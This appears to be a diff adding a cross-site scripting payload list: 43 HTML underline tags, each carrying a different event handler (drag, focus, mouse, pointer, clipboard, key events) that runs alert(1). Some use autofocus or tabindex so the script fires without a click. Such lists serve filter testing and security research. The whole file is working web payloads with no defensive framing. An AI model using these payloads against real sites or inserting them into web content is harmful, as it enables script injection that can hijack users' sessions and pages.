@@ -1,0 +1,43 @@
+<u draggable="true" ondrag="alert(1)">test</u>
+<u draggable="true" ondragend="alert(1)">test</u>
+<u draggable="true" ondragenter="alert(1)">test</u>
+<u draggable="true" ondragleave="alert(1)">test</u>
+<u draggable="true" ondragstart="alert(1)">test</u>
+<u id=x tabindex=1 onactivate=alert(1)></u>
+<u id=x tabindex=1 onbeforeactivate=alert(1)></u>
+<u id=x tabindex=1 onbeforedeactivate=alert(1)></u><input autofocus>
+<u id=x tabindex=1 ondeactivate=alert(1)></u><input id=y autofocus>
+<u id=x tabindex=1 onfocus=alert(1)></u>
+<u id=x tabindex=1 onfocusin=alert(1)></u>
+<u onafterscriptexecute=alert(1)><script>1</script>
+<u onbeforecopy="alert(1)" contenteditable>test</u>
+<u onbeforecut="alert(1)" contenteditable>test</u>
+<u onbeforepaste="alert(1)" contenteditable>test</u>
+<u onbeforescriptexecute=alert(1)><script>1</script>
+<u onblur=alert(1) tabindex=1 id=x></u><input autofocus>
+<u onclick="alert(1)">test</u>
+<u oncontextmenu="alert(1)">test</u>
+<u oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<u oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<u ondblclick="alert(1)" autofocus tabindex=1>test</u>
+<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>
+<u onkeydown="alert(1)" contenteditable>test</u>
+<u onkeypress="alert(1)" contenteditable>test</u>
+<u onkeyup="alert(1)" contenteditable>test</u>
+<u onmousedown="alert(1)">test</u>
+<u onmouseenter="alert(1)">test</u>
+<u onmouseleave="alert(1)">test</u>
+<u onmousemove="alert(1)">test</u>
+<u onmouseout="alert(1)">test</u>
+<u onmouseover="alert(1)">test</u>
+<u onmouseup="alert(1)">test</u>
+<u onmousewheel=alert(1)>requires scrolling
+<u onpaste="alert(1)" contenteditable>test</u>
+<u onpointerdown=alert(1)>XSS</u>
+<u onpointerenter=alert(1)>XSS</u>
+<u onpointerleave=alert(1)>XSS</u>
+<u onpointermove=alert(1)>XSS</u>
+<u onpointerout=alert(1)>XSS</u>
+<u onpointerover=alert(1)>XSS</u>
+<u onpointerrawupdate=alert(1)>XSS</u>
+<u onpointerup=alert(1)>XSS</u>
